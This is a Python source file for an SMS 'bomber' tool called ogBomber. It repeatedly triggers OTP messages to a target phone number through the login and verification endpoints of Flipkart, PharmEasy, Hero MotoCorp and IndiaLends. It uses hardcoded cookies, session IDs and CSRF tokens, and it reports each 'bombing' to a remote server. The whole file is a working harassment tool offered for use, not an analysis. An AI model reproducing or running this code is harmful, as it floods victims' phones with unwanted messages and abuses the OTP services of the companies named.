#bomber functions
#author : Samartha
from PyQt5 import QtCore, QtGui, QtWidgets
import requests
from selenium import webdriver
import getpass
import time
import json
import ogBomberGui as ui
un=getpass.getuser();
driver = webdriver.PhantomJS()
def ifExists(un):
    request_string="http://ogbomber.rf.gd/isExist.php?un="+un
    driver.get(request_string)
    exists_response=driver.find_element_by_id("result").text
    if 'true' in exists_response:
        return True
    elif 'false' in exists_response:
        return False

def blackList(phno):
    request_string="http://ogbomber.rf.gd/blackList.php"
    driver.get(request_string)
    bl=driver.find_element_by_id("result").text
    bl_json=json.loads(bl)
    for i in bl_json:
        if int(i)==int(phno):
            return False
    return True

def getUserDetails(un):
    request_string="http://ogbomber.rf.gd/userDetails.php?un="+un
    driver.get(request_string)
    user_details=driver.find_element_by_id("result").text
    user_details_json=json.loads(user_details)
    u=user_details_json
    return u

def checkQuota(x):
    request_string="http://ogbomber.rf.gd/checkQuota.php?id="+x["uid"]
    driver.get(request_string)
    daily_quota=driver.find_element_by_id("result").text
    try:
        int(daily_quota)
        if int(daily_quota)<200:
            return True
        else:
            return False
    except Exception :
        return True
def startBombing(pn,cc,n,un):
    new_ui = ui.Ui_OgBomber()
    i=int(n)
    while i>0:
        cookies = {
                'Cookie:T': 'BR%3Acjvqzhglu1mzt95aydzhvwzq1.1558031092050',
                'SWAB': 'build-44be9e47461a74d737914207bcbafc30',
                'lux_uid': '155867904381892986',
                'AMCVS_17EB401053DAF4840A490D4C%40AdobeOrg': '1',
                'AMCV_17EB401053DAF4840A490D4C%40AdobeOrg': '-227196251%7CMCIDTS%7C18041%7CMCMID%7C63273353035509304576927719203948933246%7CMCAID%7CNONE%7CMCOPTOUT-1558686245s%7CNONE%7CMCAAMLH-1559283845%7C12%7CMCAAMB-1559283845%7Cj8Odv6LonN4r3an7LhD3WZrU1bUpAkFkkiY1ncBR96t2PTI',
                's_cc': 'true',
                'SN': '2.VI8085A6A237EB4C62836C8809F0D312EB.SI21A9EC4E99B949B2ACE6361B3F0208CC.VS187649B2B06A44C69824006710CB6D83.1558679078',
                'gpv_pn': 'HomePage',
                'gpv_pn_t': 'Homepage',
                'S': 'd1t17GQVqPz9KPzobP3M4GQkjPy34TjfJxI4SbXVIvhwzm3mE13vfSEulmf90D/7L710qUpMq8mA0k2bx6b2DuwIS4g==',
                's_sq': '%5B%5BB%5D%5D'}

        headers = {
                    'Host': 'www.flipkart.com',
                    'Connection': 'keep-alive',
                    'Content-Length': '60',
                    'X-user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36 FKUA/website/41/website/Desktop',
                    'Origin': 'https://www.flipkart.com',
                    'Save-Data': 'on',
                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Accept': '*/*',
                    'Referer': 'https://www.flipkart.com/',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6',
                }

        data = {
                  'loginId': '+'+cc+pn,
                  'state': 'VERIFIED',
                  'churnEmailRequest': 'false'
                }

        response = requests.post('https://www.flipkart.com/api/5/user/otp/generate', headers=headers, cookies=cookies, data=data)
        i-=1
        if i<=0:
            break
        time.sleep(2)
        headers = {
            'Host': 'pharmeasy.in',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Referer': 'https://pharmeasy.in/',
            'Content-Type': 'application/json',
            'Content-Length': '30',
            'Connection': 'keep-alive',
        }
        data = {"contactNumber":pn}
        response = requests.post('https://pharmeasy.in/api/auth/requestOTP', headers=headers, json=data)
        i-=1
        # print("[+]",n-i," Messages sent")
        if i<=0:
            break
        time.sleep(2)
        cookies = {
           '_ga': 'GA1.2.1273460610.1561191565',
           '_gid': 'GA1.2.172574299.1561191565',
           '_gcl_au': '1.1.833556660.1561191566',
           '_fbp': 'fb.1.1561191568709.1707722126',
           'PHPSESSID': 'm5tap7nr75b2ehcn8ur261oq86',
           }
        headers={
               'Host': 'www.heromotocorp.com',
               'Connection': 'keep-alive',
               'Content-Length': '126',
               'Accept': '*/*',
               'Origin': 'https://www.heromotocorp.com',
               'X-Requested-With': 'XMLHttpRequest',
               'Save-Data': 'on',
               'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36',
               'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
               'Referer': 'https://www.heromotocorp.com/en-in/xpulse200/',
               'Accept-Encoding': 'gzip, deflate, br',
               'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6',
               }
        data = {
             'mobile_no': pn,
             'randome': 'ZZUC9WCCP3ltsd/JoqFe5HHe6WfNZfdQxqi9OZWvKis=',
             'mobile_no_otp': '',
             'csrf': '523bc3fa1857c4df95e4d24bbd36c61b'
           }

        response = requests.post('https://www.heromotocorp.com/en-in/xpulse200/ajax_data.php', headers=headers, cookies=cookies, data=data)
        i-=1
        if i<=0:
            break
        time.sleep(2)
        cookies = {
                      'Cookie:_ga': 'GA1.2.1483885314.1559157646',
                      '_fbp': 'fb.1.1559157647161.1989205138',
                      'TiPMix': '91.9909185226964',
                      'gcb_t_track': 'SEO - Google',
                      'gcb_t_keyword': '',
                      'gcb_t_l_url': 'https://www.google.com/',
                      'gcb_utm_medium': '',
                      'gcb_utm_campaign': '',
                      'ASP.NET_SessionId': 'ioqkek5lbgvldlq4i3cmijcs',
                      'web_app_landing_utm_source': '',
                      'web_app_landing_url': '/personal-loan',
                      'webapp_landing_referral_url': 'https://www.google.com/',
                      'ARRAffinity': '747e0c2664f5cb6179583963d834f4899eee9f6c8dcc773fc05ce45fa06b2417',
                      '_gid': 'GA1.2.969623705.1560660444',
                      '_gat': '1',
                      'current_url': 'https://indialends.com/personal-loan',
                      'cookies_plbt': '0',
                  }
        headers = {
                      'Host': 'indialends.com',
                      'Connection': 'keep-alive',
                      'Content-Length': '75',
                      'Accept': '*/*',
                      'Origin': 'https://indialends.com',
                      'X-Requested-With': 'XMLHttpRequest',
                      'Save-Data': 'on',
                      'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36',
                      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                      'Referer': 'https://indialends.com/personal-loan',
                      'Accept-Encoding': 'gzip, deflate, br',
                      'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6',
                  }

        data = {
                    'aeyder03teaeare': '1',
                    'ertysvfj74sje': cc,
                    'jfsdfu14hkgertd': pn,
                    'lj80gertdfg': '0'
                  }
        response = requests.post('https://indialends.com/internal/a/mobile-verification_v2.ashx', headers=headers, cookies=cookies, data=data)
        i-=1
    u=getUserDetails(un)
    request_string="http://ogbomber.rf.gd/insertBomb.php?id="+u["uid"]+"&pn="+pn+"&n="+str(n)
    driver.get(request_string)
    response=driver.find_element_by_tag_name("body").text
    message="Bombed Successfully\nInserted into database"
    msg = QtWidgets.QMessageBox()
    msg.setWindowTitle("Bombed!!")
    msg.setText(message)
    x = msg.exec_()

def checkConnectivity():
    url='http://www.google.com/'
    timeout=5
    try:
        requests.get(url, timeout=timeout)
        return True
    except requests.ConnectionError:
        return False
